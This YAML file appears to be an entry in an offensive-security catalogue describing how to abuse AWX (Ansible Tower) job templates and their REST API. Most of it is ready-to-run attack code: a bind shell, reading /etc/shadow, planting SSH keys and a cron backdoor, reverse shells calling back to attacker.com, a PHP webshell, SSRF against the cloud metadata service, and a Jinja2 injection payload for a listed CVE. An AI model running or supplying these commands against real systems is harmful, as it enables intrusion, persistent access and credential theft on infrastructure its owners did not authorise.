---
comment: "AWX is the open-source upstream of Ansible Tower \u2014 a web UI and REST\
  \ API for managing Ansible\nplaybooks and job templates. Any user with Job Template\
  \ execute permissions can run arbitrary\nAnsible tasks on managed hosts (and on\
  \ the AWX execution environment itself).\n\nThe core attack surface: AWX users with\
  \ \"execute\" permissions on a Job Template can inject\narbitrary Ansible tasks\
  \ via extra_vars, callback plugins, or custom playbooks stored in a\nproject SCM.\
  \ The AWX execution node runs the playbook inside an Execution Environment (EE)\n\
  container \u2014 privilege escalation to the underlying AWX host requires a container\
  \ escape\n(e.g., privileged EE or Docker socket mount).\n\nCVE-2022-2978 (CVSS 8.1):\
  \ Authenticated RCE in AWX < 21.7.0 via extra_vars SSTI in Jinja2\ntemplate processing\
  \ during playbook execution.\n\nCVE-2021-3620 (CVSS 5.5): Ansible-runner credential\
  \ exposure via crafted extra_vars that\ncause credential secrets to be printed in\
  \ task output.\n\nRef: https://www.exploit-db.com/exploits/50843\n"
functions:
  bind-shell:
  - code: |
      # Launch a job template that opens a bind shell on managed hosts via extra_vars
      curl -s -X POST "http://awx.local/api/v2/job_templates/<template_id>/launch/" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{"extra_vars": {"cmd": "ncat -lvp 12345 -e /bin/sh &"}}'

      # Or deploy directly as a playbook task:
      # - name: bind shell
      #   ansible.builtin.shell: ncat -lvp 12345 -e /bin/sh &

      # Connect from attacker: nc managed-host.local 12345
    comment: |
      Opens a bind shell on port 12345 of the managed Ansible host. The trailing & detaches
      ncat from the task so the job completes without timing out. Connect with:
      nc managed-host.local 12345
    connector: tcp-client
    contexts:
      admin:
    platform: linux
    tty: false
  file-read:
  - code: |
      # Read files from managed hosts via a job template task
      curl -s -X POST "http://awx.local/api/v2/job_templates/<template_id>/launch/" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{"extra_vars": {"cmd": "cat /etc/shadow"}}'

      # Retrieve the output after the job completes:
      JOB_ID=<job_id>
      curl -s "http://awx.local/api/v2/jobs/$JOB_ID/stdout/?format=txt" \
        -u "admin:admin"

      # Read AWX application secrets directly from the AWX host environment:
      # The AWX SECRET_KEY and database password are available in environment variables
      # or /etc/tower/conf.d/*.py on bare-metal installs, and via k8s secrets on k8s.
      curl -s "http://awx.local/api/v2/config/" -u "admin:admin" | python3 -m json.tool
    comment: "AWX job output captures stdout from all Ansible tasks, making file reads\
      \ from managed\nhosts non-blind. The /api/v2/config/ endpoint (admin only) exposes\
      \ the AWX version,\nLDAP settings, and authentication configuration.\n\nOn Kubernetes\
      \ installs, AWX secrets (SECRET_KEY, database credentials) are stored in\nk8s\
      \ Secrets \u2014 readable via: kubectl get secret awx-secret-key -o jsonpath='{.data}'\n\
      On bare-metal, look in /etc/tower/conf.d/ and /var/lib/awx/venv/awx/lib/.\n"
    contexts:
      admin:
    platform: linux
  file-write:
  - code: |
      # Write arbitrary files to managed hosts via ansible.builtin.copy in a job template
      # Playbook (write.yml) in the project Git repo:
      # ---
      # - hosts: all
      #   gather_facts: false
      #   tasks:
      #     - name: write file
      #       ansible.builtin.copy:
      #         content: "{{ file_content }}"
      #         dest: "{{ file_path }}"
      #         mode: '0600'

      # Launch with extra_vars to write an SSH authorized_keys file:
      JOB=$(curl -s -X POST "http://victim.com/api/v2/job_templates/<template_id>/launch/" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{
          "extra_vars": {
            "file_path": "/root/.ssh/authorized_keys",
            "file_content": "ssh-ed25519 AAAA...attacker_pubkey... attacker\n"
          }
        }' | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

      # Confirm via job output:
      sleep 5
      curl -s "http://victim.com/api/v2/jobs/$JOB/stdout/?format=txt" -u "admin:admin"

      # Write a cron backdoor on a managed host:
      curl -s -X POST "http://victim.com/api/v2/job_templates/<template_id>/launch/" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{
          "extra_vars": {
            "file_path": "/etc/cron.d/backdoor",
            "file_content": "* * * * * root bash -i >& /dev/tcp/attacker.com/12345 0>&1\n"
          }
        }'
    comment: |
      Uses ansible.builtin.copy to write arbitrary content to managed hosts via
      a job template. Privileged targets depend on the SSH credential configured
      in the Machine Credential (often root or a privileged service account).
      Useful write targets on managed hosts:
      - /root/.ssh/authorized_keys  (persistent SSH access)
      - /etc/cron.d/backdoor        (cron-based persistence)
      - /var/www/html/shell.php     (PHP webshell if Apache/Nginx serves PHP)
      For the AWX execution node itself, use a Job Template with a localhost
      inventory and connection: local in the playbook.
    contexts:
      admin:
    platform: linux
  rce:
  - code: |
      # Step 1: create a project pointing to an attacker-controlled Git repository
      curl -s -X POST "http://awx.local/api/v2/projects/" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{
          "name": "exploit-project",
          "scm_type": "git",
          "scm_url": "https://github.com/attacker/malicious-playbooks.git",
          "organization": 1
        }'

      # Step 2: create a Job Template using the malicious project and playbook
      curl -s -X POST "http://awx.local/api/v2/job_templates/" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{
          "name": "exploit-template",
          "job_type": "run",
          "inventory": 1,
          "project": <project_id>,
          "playbook": "shell.yml",
          "extra_vars": "{\"cmd\": \"id\"}",
          "ask_variables_on_launch": true
        }'

      # Malicious playbook content (shell.yml in attacker Git repo):
      # ---
      # - hosts: all
      #   gather_facts: false
      #   tasks:
      #     - name: rce
      #       ansible.builtin.command: "{{ cmd }}"
      #       register: out
      #     - debug: var=out.stdout_lines

      # Step 3: launch the job template
      curl -s -X POST "http://awx.local/api/v2/job_templates/<template_id>/launch/" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{"extra_vars": {"cmd": "id && hostname"}}'
    comment: |
      AWX job templates execute Ansible playbooks on managed inventory hosts. An admin user
      can create a project pointing to an attacker-controlled Git repository, then define a
      job template that runs a playbook with arbitrary shell commands via
      ansible.builtin.command or ansible.builtin.shell tasks.

      The job output (stdout) is captured in the AWX UI and REST API, making this non-blind.
      Retrieve output via: GET /api/v2/jobs/<job_id>/stdout/?format=txt
    contexts:
      admin:
    platform: linux
  - code: "# Abuse extra_vars injection on an existing Job Template with ask_variables_on_launch=true\n\
      # This works even with a low-privilege \"execute\" role \u2014 no admin required\n\
      \n# Step 1: find job templates with ask_variables_on_launch=true\ncurl -s \"\
      http://awx.local/api/v2/job_templates/?ask_variables_on_launch=true\" \\\n \
      \ -u \"user:password\" | python3 -c \"\nimport sys, json\ndata = json.load(sys.stdin)\n\
      for t in data['results']:\n    print(t['id'], t['name'], t['playbook'])\n\"\n\
      \n# Step 2: launch the template with injected extra_vars\n# If the playbook\
      \ uses {{ item }} or {{ var }} in a command task, inject shell metacharacters\n\
      JOB=$(curl -s -X POST \"http://awx.local/api/v2/job_templates/1/launch/\" \\\
      \n  -H \"Content-Type: application/json\" \\\n  -u \"user:password\" \\\n  -d\
      \ '{\"extra_vars\": {\"cmd\": \"id; cat /etc/passwd\", \"item\": \"x; id #\"\
      }}' | python3 -c \"import sys,json; print(json.load(sys.stdin)['id'])\")\n\n\
      # Step 3: retrieve job output\nsleep 5\ncurl -s \"http://awx.local/api/v2/jobs/$JOB/stdout/?format=txt\"\
      \ -u \"user:password\"\n"
    comment: |
      Job templates with ask_variables_on_launch=true allow any user with Execute role to
      supply extra_vars at launch time. If the playbook uses Jinja2 template variables in
      ansible.builtin.shell or ansible.builtin.command tasks, injecting shell metacharacters
      via extra_vars achieves RCE on every managed host in the inventory.

      CVE-2022-2978: Jinja2 SSTI in AWX < 21.7.0 allows extra_vars to escape template
      sandboxing and execute arbitrary Python expressions on the AWX execution node itself
      (not just managed hosts). Payload: {"cmd": "{{ self.__init__.__globals__.__builtins__.__import__('os').system('id') }}"}
    contexts:
      authenticated:
    platform: linux
    version: |
      AWX < 21.7.0 (CVE-2022-2978)
  reverse-shell:
  - blind: true
    code: |
      # Deploy a reverse-shell playbook via a job template
      # Attacker playbook (revshell.yml):
      cat > /tmp/revshell.yml << 'EOF'
      ---
      - hosts: all
        gather_facts: false
        tasks:
          - name: reverse shell
            ansible.builtin.shell: |
              bash -i >& /dev/tcp/attacker.com/12345 0>&1
            async: 10
            poll: 0
      EOF

      # Upload as a project file or reference via Git SCM, then launch:
      curl -s -X POST "http://awx.local/api/v2/job_templates/<template_id>/launch/" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{}'

      # Alternative: direct extra_vars injection if playbook uses shell task with {{ cmd }}:
      curl -s -X POST "http://awx.local/api/v2/job_templates/<template_id>/launch/" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{"extra_vars": {"cmd": "bash -i >& /dev/tcp/attacker.com/12345 0>&1"}}'
    comment: |
      Runs a reverse bash shell on the managed Ansible hosts via a job template. The shell
      connects back to attacker.com:12345. Using async: 10 / poll: 0 prevents the Ansible
      task from timing out waiting for the command to return.

      The reverse shell runs as the SSH user configured in the AWX Machine Credential
      (often root or a privileged service account). Set up listener: nc -lvnp 12345
    contexts:
      admin:
    listener: tcp-server
    platform: linux
    tty: false
  ssrf:
  - code: "# AWX Source Control credentials trigger an outbound Git clone/fetch when\
      \ a project\n# is synced. Supply an internal URL to probe internal services.\n\
      \n# Step 1: create a project with an internal SCM URL\ncurl -s -X POST \"http://awx.local/api/v2/projects/\"\
      \ \\\n  -H \"Content-Type: application/json\" \\\n  -u \"admin:admin\" \\\n\
      \  -d '{\n    \"name\": \"ssrf-probe\",\n    \"scm_type\": \"git\",\n    \"\
      scm_url\": \"http://169.254.169.254/latest/meta-data/\",\n    \"organization\"\
      : 1\n  }'\n\n# Step 2: trigger a project sync \u2014 AWX will attempt a git\
      \ clone to the internal URL\nPROJECT_ID=<project_id>\ncurl -s -X POST \"http://awx.local/api/v2/projects/$PROJECT_ID/update/\"\
      \ \\\n  -u \"admin:admin\"\n\n# Step 3: read the sync job output for HTTP response\
      \ details\ncurl -s \"http://awx.local/api/v2/projects/$PROJECT_ID/playbooks/\"\
      \ \\\n  -u \"admin:admin\"\n\n# Alternative: use an Inventory Source pointing\
      \ to a custom script URL\n# AWX fetches the inventory script URL directly, returning\
      \ the response to the user.\ncurl -s -X POST \"http://awx.local/api/v2/inventory_sources/\"\
      \ \\\n  -H \"Content-Type: application/json\" \\\n  -u \"admin:admin\" \\\n\
      \  -d '{\n    \"name\": \"ssrf-inv\",\n    \"source\": \"custom\",\n    \"source_vars\"\
      : \"{\\\"url\\\": \\\"http://internal-service.local:8080/admin\\\"}\",\n   \
      \ \"inventory\": 1\n  }'\n"
    comment: |
      AWX Project sync and Inventory Source features cause the AWX server to make outbound
      HTTP/Git connections to user-supplied URLs. Error messages in sync job output often
      reflect HTTP response content, enabling non-blind SSRF probing of internal services.

      Target cloud IMDS (AWS 169.254.169.254, GCP metadata.google.internal) to retrieve
      IAM credentials, or probe internal Kubernetes API servers, databases, and other
      services not accessible from the attacker's network.
    contexts:
      admin:
    platform: linux
  webshell:
  - code: |
      # Deploy a PHP webshell to a managed web host via ansible.builtin.copy
      # Requires the managed host to run Apache/Nginx serving PHP

      JOB=$(curl -s -X POST "http://victim.com/api/v2/job_templates/<template_id>/launch/" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{
          "extra_vars": {
            "file_path": "/var/www/html/shell.php",
            "file_content": "<?php if(isset($_REQUEST[\"c\"])){echo shell_exec($_REQUEST[\"c\"]);} ?>"
          }
        }' | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

      sleep 5
      curl -s "http://victim.com/api/v2/jobs/$JOB/stdout/?format=txt" -u "admin:admin"

      # Access the webshell on the managed host:
      curl "http://<managed-host>/shell.php?c=id"
    comment: |
      Writes a PHP webshell to the document root of a managed host running
      Apache or Nginx with PHP enabled, using ansible.builtin.copy via a
      job template. Replace <managed-host> with the target inventory host.
      Access at: http://<managed-host>/shell.php?c=id
      The webshell executes as the web server user (www-data, apache, or daemon).
    contexts:
      admin:
    platform: linux
...
